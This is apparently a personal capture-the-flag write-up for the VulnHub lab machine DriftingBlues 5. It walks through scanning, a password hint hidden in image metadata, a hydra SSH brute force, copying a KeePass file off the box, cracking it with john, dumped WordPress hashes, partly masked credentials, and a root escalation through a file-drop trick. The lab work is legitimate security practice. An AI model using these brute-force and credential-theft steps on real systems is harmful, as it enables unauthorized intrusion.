# BOX NAME: DriftingBlues 5
**LINK**: https://www.vulnhub.com/entry/driftingblues-5,662/

<details open><summary><ins>SUMMARY</ins></summary>

```
1. Enumerate box and find wordpress-site. use a scanner then bruteforce the password.
2. Get stuck, pull hair, admit defeat..(who hides info inside a picture?!)
3. Get back up. Enumerate local. 
4. transfer and krack keyfile
. Get root. Yikes..

This box actually had me stuck for a while. I couldn't seem to get in. I researched wordpress plugins, themes, known exploits, bruteforced the ssh but seemingly no luck. So I hade to look at a writeup and man oh man did I get frustrated. A PICTURE. dayum.
This box was all but smooth sailing. Stuck two times, what? I got the keyfile, i tried all the passwords, i tried cracking the hashes. I found the process of root [/bin/bash /root/key.sh] but couldn't figure it out. I had to look up another writeup. If I could've seen into key.sh I would've smacked this box. 
```
</details>

# REMOTE ENUMERATION:

<details><summary><ins>TARGET</ins></summary>

```
[+] IP:		10.77.0.52
[+] URL:	http://driftingblues.box
```
</details>
<details><summary><ins>NMAP</ins></summary>

```
└─$ nmap -sV -sC $IP -oN nmap-db5.log                   
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-27 08:37 CEST
Nmap scan report for test.driftingblues.box (10.77.0.52)
Host is up (0.00034s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 6afed61723cb90792bb12d3753974658 (RSA)
|   256 5bc468d18959d748b096f311871c08ac (ECDSA)
|_  256 613966881d8ff1d040611e99c51a1ff4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-generator: WordPress 5.6.2
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: diary &#8211; Just another WordPress site
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.98 seconds
```
</details>
<details><summary><ins>WEB</ins></summary>

whatweb-scan

```
└─$ whatweb $URL --log-verbose=whatweb-db5.log          
http://driftingblues.box [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[10.77.0.52], MetaGenerator[WordPress 5.6.2], PoweredBy[--], Script, Title[diary &#8211; Just another WordPress site], UncommonHeaders[link], WordPress[5.6.2]
```

nikto-scan

```
└─$ nikto -h $IP | tee nikto-db5.log
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.77.0.52
+ Target Hostname:    10.77.0.52
+ Target Port:        80
+ Start Time:         2023-04-27 08:37:51 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.38 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: Drupal Link header found with value: <http://10.77.0.52/index.php/wp-json/>; rel="https://api.w.org/". See: https://www.drupal.org/
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /index.php?: Uncommon header 'x-redirect-by' found, with contents: WordPress.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.38 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version.
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ /license.txt: License file found may identify site software.
+ /: A Wordpress installation was found.
+ /wp-login.php?action=register: Cookie wordpress_test_cookie created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /wp-content/uploads/: Directory indexing found.
+ /wp-content/uploads/: Wordpress uploads directory is browsable. This may reveal sensitive information.
+ /wp-login.php: Wordpress login found.
+ 8102 requests: 0 error(s) and 15 item(s) reported on remote host
+ End Time:           2023-04-27 08:38:24 (GMT2) (33 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

fuzzing

```

```
wpscan

```
└─$ cat wpscan-db5.log   
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://driftingblues.box/ [10.77.0.52]
[+] Started: Thu Apr 27 08:39:32 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.38 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://driftingblues.box/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://driftingblues.box/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://driftingblues.box/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://driftingblues.box/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.2 identified (Latest, released on 2023-03-29).
 | Found By: Rss Generator (Passive Detection)
 |  - http://driftingblues.box/index.php/feed/, <generator>https://wordpress.org/?v=6.2</generator>
 |  - http://driftingblues.box/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.2</generator>

[+] WordPress theme in use: twentytwentyone
 | Location: http://driftingblues.box/wp-content/themes/twentytwentyone/
 | Last Updated: 2023-03-29T00:00:00.000Z
 | Readme: http://driftingblues.box/wp-content/themes/twentytwentyone/readme.txt
 | [!] The version is out of date, the latest version is 1.8
 | Style URL: http://driftingblues.box/wp-content/themes/twentytwentyone/style.css?ver=1.1
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://driftingblues.box/wp-content/themes/twentytwentyone/style.css?ver=1.1, Match: 'Version: 1.1'


[i] No plugins Found.


[i] User(s) Identified:

[+] abuzerkomurcu
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://driftingblues.box/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] gill
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] collins
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] satanic
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] gadd
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu Apr 27 08:39:36 2023
[+] Requests Done: 66
[+] Cached Requests: 11
[+] Data Sent: 17.527 KB
[+] Data Received: 918.972 KB
[+] Memory used: 263.477 MB
[+] Elapsed time: 00:00:03

```
```
└─$ exiftool dblogo.png 
ExifTool Version Number         : 12.57
File Name                       : dblogo.png
--snip--
--snip--
History Changed                 : /
Text Layer Name                 : ssh password is 59583#### of course it is lowercase maybe not
Text Layer Text                 : ssh password is 59583#### of course it is lowercase maybe not :)
Document Ancestors              : adobe:docid:photoshop:871a8adf-5521-894c-8a18-2b27c91a893b
Image Size                      : 300x300
Megapixels                      : 0.090


```

</details>
<details><summary><ins>OTHER</ins></summary>

SSH (Port 22)
```
hydra -L usernames.txt -p 59583##### $IP ssh
[22][ssh] host: 10.77.0.52   login: gill   password: 59583####

gill@driftingblues:~$ scp keyfile.kdbx jockemedlinux@10.77.0.35:/home/jockemedlinux/
└─$ file keyfile.kdbx 
keyfile.kdbx: Keepass password database 2.x KDBX
```

DNS (Port 53)
```

```

</details>


# LOCAL ENUMERATION:

<details><summary><ins>FILES OF INTEREST</ins></summary>

**FILES**:
```
keyfile.dbx | Keepass password database 2.x KDBX
 --> porsi####       (keyfile)   
 To read the file I needed to install keepass2 package. (apt install keepass2 or keepassxc)
 Exported the contents to keyfile.csv.

 "Account","Login Name","Password","Web Site","Comments"
"zakkwylde","","","",""
"buddyretard","","","",""
"2real4surreal","","","",""
"closet313","","","",""
"fracturedocean","","","",""
"exalted","","","",""

I tried all the passwords.
I got the wp-config.php file
```

**SUID's**:

```
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/chsh
```
**SGID's**:

```
/usr/bin/crontab
/usr/bin/chage
/usr/bin/wall
/usr/bin/bsd-write
/usr/bin/expiry
/usr/bin/ssh-agent
/usr/bin/dotlockfile
/usr/sbin/unix_chkpwd

```
**OTHERS**:

```

```
</details>

<details><summary><ins>USEFUL INFORMATION:</ins></summary>

**Kernel Info:**
file /bin/bash ; echo -e " \\n" && lsb_release -a ; echo -e "\\n" && uname -a

```
/bin/bash: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=ffe165dc81a64aea2b05beda07aeda8ad71f1e7c, stripped
 

No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 10 (buster)
Release:        10
Codename:       buster                                                                                              
                                                                                                                    
                                                                                                                                    
Linux driftingblues 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64 GNU/Linux 
```
</details>

<details><summary><ins>CREDS:</ins></summary>

```
username:password
abuzerkomurcu
gill:interchang##### 	[WP]
gill:59583##### 		[ssh]
gadd
satanic
collins
wpuser :  .:.zurrak.:.	[mysql]
root:imjustdrifting##
```
</details>

<details><summary><ins>HASHES:</ins></summary>

```
└─$ cat hash.txt         
keyfile:$keepass$*2*60000*0*86fe1a63955b5984c0adb127a869153f24c41fdc56678d555f778d1309f9867c*e580d1bef4bf0f44b845fce13c9648cd22f143760be5bae503a419a7f76a21f0*e99d45aab90c26200191dbca6b3fae34*e3169392c5eec5e094b1f22a01084f894598280874de2bf8291ea2185051f7e3*78d0b1eb59343754ce0ce33b2efb5e25c595317099a65ed208bfc2f6ab8c8dcd

└─$ john hash.txt -w=/base/wordlists/password/rockyou.txt


+----+---------------+------------------------------------+---------------+---------------------------------+---------------------+---------------------+-----------------------------------------------+-------------+---------------+
| ID | user_login    | user_pass                          | user_nicename | user_email                      | user_url            | user_registered     | user_activation_key                           | user_status | display_name  |
+----+---------------+------------------------------------+---------------+---------------------------------+---------------------+---------------------+-----------------------------------------------+-------------+---------------+
|  1 | abuzerkomurcu | $P$BL3XUkLhw0F62uZTIs/3KWCUZdqWUQ0 | abuzerkomurcu | abuzerkomurcu@driftingblues.box | http://192.168.2.24 | 2021-02-23 23:42:27 |                                               |           0 | abuzerkomurcu |
|  2 | gill          | $P$BIZvDSmeVtwm6l0/K5bpjm331WhDT/1 | gill          | gill@driftingblues.box          |                     | 2021-02-24 12:59:26 |                                               |           0 | gill          |
|  3 | collins       | $P$BTcbcPO9E1zytnAB25UZQ7aNIuNELT1 | collins       | collins@driftingblues.box       |                     | 2021-02-24 14:36:13 |                                               |           0 | collins       |
|  4 | satanic       | $P$BvhdBxQPUL79N/dbHGb9g/PzVj4VjP1 | satanic       | satanic@satan.com               |                     | 2021-02-24 14:42:50 | 1614177771:$P$BQ2dDrasraa.lhT9LVFVibezre4nfM/ |           0 | satanic       |
|  5 | gadd          | $P$BucLX701x.Q.WF4EM6m7HFdzJAz41Z. | gadd          | gadd@driftingblues.box          |                     | 2021-02-24 14:43:28 | 1614177808:$P$B3fGszii.ORp1tnmltWHhg8QlvLTsc. |           0 | gadd          |
+----+---------------+------------------------------------+---------------+---------------------------------+---------------------+---------------------+-----------------------------------------------+-------------+---------------+

```
</details>

# Proofs

<details><summary><ins>Proofs</ins></summary>

Final payload:
```
Put ONE of the lines from the keepass file AS a file into /keyfolder and wait for rootcreds.txt. 
gill@driftingblues:/keyfolder$ ll
total 12K
4.0K drwx---rwx  2 root root 4.0K Apr 27 02:22 .
4.0K -rw-r--r--  1 root root   29 Apr 27 02:22 rootcreds.txt
   0 -rw-r--r--  1 gill gill    0 Apr 27 02:19 fracturedocean
4.0K drwxr-xr-x 19 root root 4.0K Feb 24  2021 ..


Some say this is a hard box. This is an impossible box..
```
```
gill@driftingblues:~$ cat user.txt 
flag 1/2
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
░░░░█░░░░░░░░░░░░░░░░░░░░░░█
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
░░░░░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
░░░░▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█
░░█░░▌░█░░█░░█░░░█░░█░░█
░░█░░▀▀░░██░░█░░░█░░█░░█
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█

```
```
root@driftingblues:/keyfolder# cat /root/root.txt
flag 2/2
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
░░░░█░░░░░░░░░░░░░░░░░░░░░░█
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
░░▐▌░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
░░░█▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█
░░█░░▌░█░░█░░█░░░█░░█░░█
░░█░░▀▀░░██░░█░░░█░░█░░█
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█

congratulations!

```
</details>